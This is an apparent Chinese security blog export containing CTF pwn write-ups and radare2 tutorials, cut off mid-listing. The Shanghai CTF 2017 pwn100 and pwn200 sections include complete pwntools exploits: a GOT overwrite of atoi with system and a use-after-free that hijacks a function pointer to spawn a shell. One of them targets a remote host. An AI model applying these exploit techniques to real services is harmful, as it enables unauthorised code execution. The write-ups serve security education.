<h5 id="通过-got-plt-表-直接劫持程序"><a href="#通过-got-plt-表-直接劫持程序" class="headerlink" title="通过 got/plt 表 直接劫持程序"></a>通过 got/plt 表 直接劫持程序</h5><p>测试程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line">#include &lt;stdio.h&gt;</div><div class="line">#include &lt;stdlib.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line"></div><div class="line">// Damn_YoU_Got_The_Flag</div><div class="line">char password[] = &quot;\x18\x3d\x31\x32\x03\x05\x33\x09\x03\x1b\x33\x28\x03\x08\x34\x39\x03\x1a\x30\x3d\x3b&quot;;</div><div class="line"></div><div class="line">inline int check(char* input);</div><div class="line"></div><div class="line">int check(char* input) &#123;</div><div class="line">  for (int i = 0; i &lt; sizeof(password) - 1; ++i) &#123;</div><div class="line">    password[i] ^= 0x5c;</div><div class="line">  &#125;</div><div class="line">  return memcmp(password, input, sizeof(password) - 1);</div><div class="line">&#125;</div><div class="line"></div><div class="line">int main(int argc, char **argv) &#123;</div><div class="line"></div><div class="line">  if (check(argv[1]) == 0) &#123;</div><div class="line">    puts(&quot;You got it !!&quot;);</div><div class="line">    return EXIT_SUCCESS;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  puts(&quot;Wrong&quot;);</div><div class="line">  return EXIT_FAILURE;</div><div class="line"></div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p><code>hook.c</code> 内容，hook memcpy, 打印内容。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">#include &quot;arch/x86_64/syscall.c&quot;</div><div class="line">#define stdout 1</div><div class="line"></div><div class="line">//gcc -nostdlib -nodefaultlibs -fPIC -Wl,-shared hook.c -o hook</div><div class="line"></div><div class="line">int my_memcmp(const void* lhs, const void* rhs, int n) &#123;</div><div class="line">  const char msg[] = &quot;Hook add\n&quot;;</div><div class="line">  _write(stdout, msg, sizeof(msg));</div><div class="line">  _write(stdout, (const char*)lhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  _write(stdout, (const char*)rhs, n);</div><div class="line">  _write(stdout, &quot;\n&quot;, 2);</div><div class="line">  return 0;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>hook 脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">import lief</div><div class="line"></div><div class="line">crackme = lief.parse(&quot;crackme.bin&quot;)</div><div class="line">hook = lief.parse(&quot;hook&quot;)</div><div class="line"></div><div class="line">segment_added = crackme.add(hook.segments[0])</div><div class="line"></div><div class="line">my_memcmp = hook.get_symbol(&quot;my_memcmp&quot;)</div><div class="line">my_memcmp_addr = segment_added.virtual_address + my_memcmp.value</div><div class="line"></div><div class="line">crackme.patch_pltgot(&apos;memcmp&apos;, my_memcmp_addr)</div><div class="line">crackme.write(&quot;crackme.hooked&quot;)</div></pre></td></tr></table></figure></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1510065926275fzlkcrtw.png?imageslim" alt="paste image"><br>参考：</p>
<p><a href="https://lief.quarkslab.com/doc/tutorials/" target="_blank" rel="external">https://lief.quarkslab.com/doc/tutorials/</a></p>
<p><a href="https://github.com/lunixbochs/patchkit" target="_blank" rel="external">https://github.com/lunixbochs/patchkit</a></p>
]]></content>
      
        <categories>
            
            <category> 文件patch </category>
            
        </categories>
        
        
        <tags>
            
            <tag> patch </tag>
            
            <tag> elf patch </tag>
            
            <tag> pe patch </tag>
            
            <tag> mach-o patch </tag>
            
            <tag> ctf </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上海ctf2017 pwn100 && pwn200]]></title>
      <url>/2017/11/05/shctf2017_pwn100_pwn200.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>尽量详细，给有需要的学弟们看看<br>分析的 idb 文件在这：</p>
<p><a href="https://gitee.com/hac425/blog_data/tree/master/shanghaictf" target="_blank" rel="external">https://gitee.com/hac425/blog_data/tree/master/shanghaictf</a></p>
<h3 id="pwn100"><a href="#pwn100" class="headerlink" title="pwn100"></a>pwn100</h3><p>程序是一个经典的 堆管理程序，基本增删改查功能。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098962009599uzwpyqa.png?imageslim" alt="paste image"></p>
<p><code>add</code> 功能很正常，分配8字节的内存然后写入8字节内容。把 分配到的 <code>heap</code>指针存到 <code>table</code> 中，然后 <code>count++</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509896434623h6e9584f.png?imageslim" alt="paste image"></p>
<p>我们调试看看，使用 <code>add</code> 功能然后 看看堆的内容</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15098965027379oqb1bwg.png?imageslim" alt="paste image"></p>
<p>可以看到尽管 <code>malloc(8)</code> 实际会分配 <code>0x20</code> 字节（0x10 chunk结构 + 8 + 8 字节 对齐padding）<br>所以这里应该没有溢出的问题，但是注意 <code>count</code> 变量会索引到下一个没有使用的 <code>table</code> 表项。</p>
<p>这个程序的问题在于，在 <code>get_last</code>, <code>edit</code> 时会直接使用 <code>table[count]</code> 来获取要处理的指针， 而且在 <code>delete</code> 时就只是简单的 <code>count--</code>,而且<code>count</code> 是一个有符号整数。这样多次 <code>delete</code> 后，<code>count</code> 会变成 负数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509934315611x779r1bk.png?imageslim" alt="paste image"></p>
<p>然后 通过<code>table[count]</code>（<code>*(table + count*8)</code>） ,这样我们就可以通过<code>get_last</code>, <code>edit</code>来 泄露内存和 修改内存了。</p>
<p><code>ctf</code> 中利用漏洞的目标一般就是执行 <code>system(&#39;sh&#39;)</code>,在这里我们可以通过修改 <code>got</code> 表中<code>atoi</code>函数的指针为 <code>system</code> 的函数，然后在调用 <code>atoi</code> 函数时，就会去调用 <code>system</code> 函数了。为什么要选择 <code>atoi</code> 函数作为目标呢？</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15099347624636c7nenso.png?imageslim" alt="paste image"><br>在打印程序的菜单后，会要我们输入一个选项，这就会调用这个函数，可以看到他会读取 <code>16</code> 字节到 <code>nptr</code>, 然后传到 <code>atoi</code>,如果我们把 <code>atoi</code> 改成<code>system</code>, 然后输入 <code>sh</code> , 就会执行 <code>system(&#39;sh&#39;)</code> 了，目标达到。</p>
<p>由于是这样获取内存地址： <code>*(table + count*8)</code>， 所以我们需要在 <code>table</code> 的上面（就是地址 &lt; table的地址） 区域找到一个 指向 <code>got</code> 的指针。我们可以使用 <code>pwndbg</code> 的 <code>searchmem</code> 来搜索</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935326266sve8pr7a.png?imageslim" alt="paste image"></p>
<p>属于</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509935380746in5n7zt4.png?imageslim" alt="paste image"></p>
<p>那么现在利用的思路就很清晰了。</p>
<ul>
<li>首先多次调用 <code>delete</code> 函数使得 <code>table + count*8</code> 指向 这里的 <code>atoi</code> 函数对应的地址，也就是 <code>0x400588</code>.</li>
</ul>
<ul>
<li><p>然后我们就可以通过 <code>get_last</code> 功能打印 <code>atoi</code> 函数的地址，通过<code>atoi</code> 在 <code>libc</code> 中的固定偏移，泄露 <code>libc</code> 的地址。</p>
</li>
<li><p>然后获取 <code>system</code> 函数地址，然后使用 <code>edit</code> 修改 <code>atoi</code> 函数的地址改成 <code>system</code>函数地址。然后输入<code>sh</code>  即可。</p>
</li>
</ul>
<p>exp(要跑 20几分钟左右):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># context.log_level = &apos;debug&apos;</div><div class="line">p = process(&quot;./list&quot;)</div><div class="line"></div><div class="line">puts_plt = 0x602018</div><div class="line"></div><div class="line"></div><div class="line">def add(content):</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;1&quot;)</div><div class="line">    p.recvuntil(&quot;Input your content:\n&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.sendline(content)</div><div class="line"></div><div class="line"></div><div class="line">def get_last_content():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;2&quot;)</div><div class="line">    p.recvuntil(&apos;4.Delete&apos;)</div><div class="line">    p.recvuntil(&apos;5.Exit\n&apos;)</div><div class="line">    content = p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    addr = u64(content[:6].ljust(8, &apos;\x00&apos;))</div><div class="line">    hexdump(content)</div><div class="line">    hexdump(content)</div><div class="line">    return addr</div><div class="line"></div><div class="line"></div><div class="line">def edit(content):</div><div class="line">    p.sendline(&quot;3&quot;)</div><div class="line">    sleep(0.5)</div><div class="line">    p.send(content)</div><div class="line"></div><div class="line"></div><div class="line">def delete():</div><div class="line">    p.recvuntil(&quot;5.Exit\n&quot;)</div><div class="line">    p.sendline(&quot;4&quot;)</div><div class="line"></div><div class="line"># alloc 3 chunk before to 3</div><div class="line"></div><div class="line"></div><div class="line">def get_count_to_addr(addr):</div><div class="line">    time = 0x602080 + 3 * 8 - addr</div><div class="line">    time = time / 8</div><div class="line"></div><div class="line">    print time</div><div class="line">    for i in range(time):</div><div class="line">        # sleep(0.5)</div><div class="line">        delete()</div><div class="line"></div><div class="line"></div><div class="line">gdb.attach(p)</div><div class="line"></div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(&quot;B&quot; * 8)</div><div class="line">add(p64(puts_plt))</div><div class="line">pause()</div><div class="line"></div><div class="line"></div><div class="line">get_count_to_addr(0x400588)</div><div class="line"></div><div class="line">print &quot;modify the count to fushu&quot;</div><div class="line">pause()</div><div class="line"></div><div class="line">print &quot;::::&quot; * 10</div><div class="line"></div><div class="line">atoi_addr = get_last_content()</div><div class="line">libc_addr = atoi_addr - 0x36e80</div><div class="line">system_addr = libc_addr + 0x45390</div><div class="line"></div><div class="line">log.success(&quot;system: &quot; + hex(system_addr))</div><div class="line"></div><div class="line">edit(p64(system_addr))</div><div class="line"></div><div class="line">log.success(&quot;modify atoi---&gt; system&quot;)</div><div class="line"></div><div class="line">p.sendline(&quot;sh&quot;)</div><div class="line"></div><div class="line">p.interactive()</div><div class="line"></div><div class="line"></div><div class="line"># bp 0x0400924</div></pre></td></tr></table></figure>
<h3 id="pwn200"><a href="#pwn200" class="headerlink" title="pwn200"></a>pwn200</h3><p>就是用<code>c++</code> 写的程序比较难看，不过看到程序的菜单，漏洞就很清楚了。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936031356ptc0dds9.png?imageslim" alt="paste image"><br>提示的很明显了，应该是 <code>uaf</code>, 那我们就重点看看与内存分配相关的位置。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936258753devxv5lf.png?imageslim" alt="paste image"></p>
<p>首先会分配两个结构体，其中开始8字节被写入了函数的指针。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936430537ciumch55.png?imageslim" alt="paste image"><br>可以看到内存块的大小为 <code>0x40</code> 大小。通过 <code>new(0x30)</code> 分配得到，所以 <code>new</code> 和 <code>malloc</code> 的分配方式应该是一样的。接着往下看。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150993658543336ohfyxh.png?imageslim" alt="paste image"><br>选择<code>2</code> 时，可以有我们提供大小，传到 <code>new</code> ,然后通过 <code>read</code> 写入内容。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509936668993dl8aosz9.png?imageslim" alt="paste image"></p>
<p><code>free</code> 时会调用 <code>delete</code>  释放掉内存块。<code>free</code> 之后可以看到进入了<code>fastbin</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/15099367564697zfv0v57.png?imageslim" alt="paste image"><br>那此时我们使用 <code>2</code> 号功能，连续分配两块 <code>48</code>(0x30) 字节的内存，就会拿到这两块内存了。</p>
<p>程序中内置了<code>getshell</code>函数</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937226801kdjz5ggb.png?imageslim" alt="paste image"></p>
<p>所以我们在拿到那两块内存后，把开始 8 字节写成 <code>getshell-8</code> 函数的地址就行了。（减8的原因看下图）<br>然后使用 <code>1</code> 功能，就能调用了。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509937318915n5tt0od8.png?imageslim" alt="paste image"></p>
<p>exp中把 开始 8 字节改成了  <code>0x0602D50</code><br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509946173632ju0gczy8.png?imageslim" alt="paste image"><br>exp:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">from pwn import *</div><div class="line"></div><div class="line"># p = process(&quot;./p200&quot;)</div><div class="line">p = remote(&quot;106.75.8.58&quot;, 12333)</div><div class="line">context.log_level = &apos;debug&apos;</div><div class="line"></div><div class="line">get_shell = p64(0x0602D50)</div><div class="line"></div><div class="line">payload = get_shell</div><div class="line">payload += &quot;A&quot; * (48 - len(payload))</div><div class="line"></div><div class="line"># gdb.attach(p)</div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&apos;3&apos;)</div><div class="line"># 先释放掉那两个块</div><div class="line">pause()</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(payload)</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.recvuntil(&quot;1. use, 2. after, 3. free\n&quot;)</div><div class="line">p.sendline(&quot;2&quot;)</div><div class="line">p.recvuntil(&quot;Please input the length:\n&quot;)</div><div class="line">p.sendline(&quot;48&quot;)</div><div class="line">sleep(0.5)</div><div class="line">p.sendline(payload)</div><div class="line"></div><div class="line"># 分配两个块，占用刚刚释放的块， 开始8字节 为 0x0602D50</div><div class="line">pause()</div><div class="line"></div><div class="line">sleep(0.5)</div><div class="line"></div><div class="line">p.sendline(&quot;1&quot;)</div><div class="line">p.interactive()</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> ctf </category>
            
        </categories>
        
        
        <tags>
            
            <tag> heap </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之radare2使用实战]]></title>
      <url>/2017/11/01/step_by_step_pwn_router_part8.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p>前文讲了一些 <code>radare2</code> 的特性相关的操作方法。本文以一个 <code>crackme</code> 来具体介绍下 <code>radare2</code> 的使用</p>
<p>程序的地址： <a href="https://gitee.com/hac425/blog_data/blob/master/crackme0x03" target="_blank" rel="external">在这里</a></p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先使用 <code>radare2</code> 加载该程序。使用了 <code>aaa</code> 分析了程序中的所有函数。使用 <code>iI</code> 查看二进制文件的信息。可以看到是 <code>32</code> 位的。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536312825toj2ruk1.png?imageslim" alt="paste image"></p>
<p>使用 <code>aaa</code>分析完程序后，可以使用 <code>afl</code> 查看所有的函数。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536413775tyxowxq5.png?imageslim" alt="paste image"><br>直接跳到 <code>main</code> 函数看看逻辑</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15095364686834obsuwoc.png?imageslim" alt="paste image"></p>
<p>不习惯看文本模式的汇编的话，可以使用 <code>VV</code> 进入图形化模式<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536557600j6sv26da.png?imageslim" alt="paste image"></p>
<p>拿到个程序，我会首先看函数调用理解程序的大概流程。比如这里先调用了 <code>printf</code> 打印了一些提示信息，然后使用 <code>scanf</code> 获取我们的输入，分析 <code>scanf</code>的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">|           0x080484cc      8d45fc         lea eax, [local_4h]</div><div class="line">|           0x080484cf      89442404       mov dword [local_4h_2], eax</div><div class="line">|           0x080484d3      c70424348604.  mov dword [esp], 0x8048634  ; [0x8048634:4]=0x6425</div><div class="line">|           0x080484da      e851feffff     call sym.imp.scanf          ; int scanf(const char *format)</div></pre></td></tr></table></figure></p>
<p>我们可以知道<code>0x8048634</code> 是我们的第一个参数, <code>local_4h</code>是我们的第二个参数。看看 <code>0x8048634</code>存放的是什么。<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509536913132ckutls7d.png?imageslim" alt="paste image"></p>
<p>所以程序需要我们输入的是一个 整数，然后把它存在 <code>local_4h</code>里面了。那我们就可以把  <code>local_4h</code> 变量改下名字。这里改成 <code>input</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509537156669asiszojb.png?imageslim" alt="paste image"></p>
<p>继续往下看发现 <code>input</code> 变量后来没有被处理直接传到了  <code>test</code> 函数。他的第二个参数是这样生成的</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509538263559azqlu0hp.png?imageslim" alt="paste image"></p>
<p>为了获得这个参数我们有很多方法，比如 我们可以直接静态分析，或者用 <code>gdb</code> 调试这都很容易得到结果。</p>
<p>这里正好试试 <code>radare</code> 的模拟执行功能。使用该功能我们需要先分析要模拟执行的代码对环境的依赖，比如寄存器的值，内存的值等，然后根据依赖关系修改内存和寄存器的值来满足代码运行的上下文。</p>
<p>在这里这段代码只对栈的内存进行了处理。那我们就先分配一块内存，然后用 <code>esp</code> 刚刚分配的内存。由于这里一开始没有对内存数据进行读取，所以我们直接使用分配的内存就好，不用对他进行处理。</p>
<p>首先我们跳到目标地址，然后使用 <code>aei</code> 或者 <code>aeip</code> 初始化虚拟机堆栈，然后使用 <code>aer</code> 查看寄存器状态。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/15095388389068csy8248.png?imageslim" alt="paste image"></p>
<p>然后分配一块内存作为栈内存，给程序模拟执行用。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509538957638rwu5ocqr.png?imageslim" alt="paste image"></p>
<p>在 <code>0xff0000</code> 分配了 <code>0x40000</code> 大小的内存。然后把 <code>esp</code> 和 <code>ebp</code> 指到这块内存里面。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509539081176y3sckgra.png?imageslim" alt="paste image"></p>
<p>然后我们让模拟器运行到 <code>0x0804850c</code> 也就是调用 <code>test</code> 函数的位置处，查看他的参数，可以看到第二个参数的值就是 <code>0x00052b24</code></p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509539169362t234cqgc.png?imageslim" alt="paste image"><br>最后我们进去 <code>test</code> 函数里面看看</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/150953929096164elui3y.png?imageslim" alt="paste image"><br>就是判断 <code>参数一</code> 和 <code>参数二</code> 是否一致，所以这个 <code>crackme</code> 的 <code>key</code> 就是 <code>0x00052b24</code> 十进制数表示 <code>338724</code>.<br><img src="http://oy9h5q2k4.bkt.clouddn.com/1509539408734tys3o1xg.png?imageslim" alt="paste image"></p>
<p>成功</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>radare2</code> 的模拟执行功能是通过 <code>esil</code> 来实现的，粗略的试了一下感觉还是挺不错的感觉和  <code>unicorn</code> 有的一拼，不过<code>radare2</code>也是有 <code>unicorn</code>的插件的。</p>
<p> 参考：</p>
<p> <a href="http://radare.org/r/talks.html" target="_blank" rel="external">http://radare.org/r/talks.html</a></p>
<p> <a href="https://github.com/radare/radare2book" target="_blank" rel="external">https://github.com/radare/radare2book</a></p>
<p> <a href="https://codeload.github.com/radareorg/r2con/" target="_blank" rel="external">https://codeload.github.com/radareorg/r2con/</a></p>
]]></content>
      
        <categories>
            
            <category> 路由器安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> radare2 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[一步一步pwn路由器之radare2使用全解]]></title>
      <url>/2017/10/31/step_by_step_pwn_router_part7.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><hr>
<p>本文首发于 先知安全技术社区：  <a href="https://xianzhi.aliyun.com/forum/user/5274/" target="_blank" rel="external">https://xianzhi.aliyun.com/forum/user/5274/</a></p>
<hr>
<p><code>radare2</code> 最近越来越流行，已经进入 <code>github</code> 前 25了，看到大佬们纷纷推荐，为了紧跟时代潮流，我也决定探究探究这款 <code>神器</code> 。下面画画重点，以便以后需要用了，可以方便查找。</p>
<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>首先是安装 <code>radare2</code> ,直接去官方 <code>github</code> 安照指示安装即可。先把源代码下载下来</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">https://github.com/radare/radare2</div></pre></td></tr></table></figure>
<p>然后进入源码目录，执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sys/install.sh</div></pre></td></tr></table></figure>
<p><code>radare2</code> 支持各种各样的平台，文件格式，具体可以看官网描述。它有很多各组件分别进行不同的工作。这些组件是：</p>
<ul>
<li>rax2 ———&gt; 用于数值转换</li>
<li>rasm2  ——-&gt;  反汇编和汇编</li>
<li>rabin2 ——-&gt;  查看文件格式</li>
<li>radiff2 ——&gt;  对文件进行 diff</li>
<li>ragg2/ragg2­cc ——&gt;  用于更方便的生成shellcode</li>
<li>rahash2 ——&gt; 各种密码算法， hash算法</li>
<li>radare2 ——&gt; 整合了上面的工具</li>
</ul>
<h3 id="rax2"><a href="#rax2" class="headerlink" title="rax2"></a>rax2</h3><p>数值转换，程序的 <code>help</code> 菜单很明确了:</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509440109544fxedvvf0.png?imageslim" alt="paste image"></p>
<p>比如输入<code>rax2 -s 414141</code> ,会返回 <code>AAAA</code></p>
<h3 id="rabin2"><a href="#rabin2" class="headerlink" title="rabin2"></a>rabin2</h3><p>对各种文件格式进行解析。</p>
<p><code>rabin2 -I hello_pwn</code> 显示文件的信息</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509442510111na1s1dfo.png?imageslim" alt="paste image"></p>
<p>使用 <code>-l</code> 显示依赖库。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509442808573t2mk98r0.png?imageslim" alt="paste image"></p>
<p>使用 <code>-zz</code> 显示字符串信息，可以显示 <code>utf-8</code> 等宽字节字符串。</p>
<p><img src="http://oy9h5q2k4.bkt.clouddn.com/1509442931440cmccvl54.png?imageslim" alt="paste image"></p>
<p>可以看到显示了长度，所在位置等信息。</p>
<p>通过使用 <code>-O</code> 选项可以修改一些文件的信息。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rabin2 -O?</div><div class="line">Operation string:</div><div class="line">  Change Entrypoint: e/0x8048000</div><div class="line">  Dump Symbols: d/s/1024</div><div class="line">  Dump Section: d/S/.text</div><div class="line">  Resize Section: r/.data/1024</div><div class="line">  Remove RPATH: R</div><div class="line">  Add Library: a/l/libfoo.dylib</div><div class="line">  Change Permissions: p/.data/rwx</div><div class="line">  Show LDID entitlements: C</div></pre></td></tr></table></figure>
<p>比如修改 <code>section</code> 的属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rabin2 -S a.out | grep text</div><div class="line">idx=14 vaddr=0x00400430 paddr=0x00000430 sz=386 vsz=386 perm=--rwx name=.text</div><div class="line">haclh@ubuntu:~$ rabin2 -O p/.text/r a.out </div><div class="line">wx 02 @ 0x1d60</div><div class="line">haclh@ubuntu:~$ rabin2 -S a.out | grep text</div><div class="line">idx=14 vaddr=0x00400430 paddr=0x00000430 sz=386 vsz=386 perm=--r-- name=.text</div></pre></td></tr></table></figure>
<h3 id="rasm2"><a href="#rasm2" class="headerlink" title="rasm2"></a>rasm2</h3><p>这个工具用于进行各种平台的汇编和反汇编。该工具的主要选项有。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-a 设置汇编和反汇编的架构（比如x86,mips, arm...）</div><div class="line">-L  列举支持的架构。</div><div class="line">-b  设置 位数</div><div class="line">-d，-D  反汇编 提供的 16进制字符串。</div></pre></td></tr></table></figure></p>
<p>使用示例：<br>首先列举支持的架构（使用 <code>head</code> 只列举前面几项）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">haclh@ubuntu:~$ rasm2 -L | head</div><div class="line">_dAe  8 16       6502        LGPL3   6502/NES/C64/Tamagotchi/T-1000 CPU</div><div class="line">_dA_  8          8051        PD      8051 Intel CPU</div><div class="line">_dA_  16 32      arc         GPL3    Argonaut RISC Core</div><div class="line">a___  16 32 64   arm.as      LGPL3   as ARM Assembler (use ARM_AS environment)</div><div class="line">adAe  16 32 64   arm         BSD     Capstone ARM disassembler</div><div class="line">_dA_  16 32 64   arm.gnu     GPL3    Acorn RISC Machine CPU</div><div class="line">_d__  16 32      arm.winedbg LGPL2   WineDBG&apos;s ARM disassembler</div><div class="line">adAe  8 16       avr         GPL     AVR Atmel</div><div 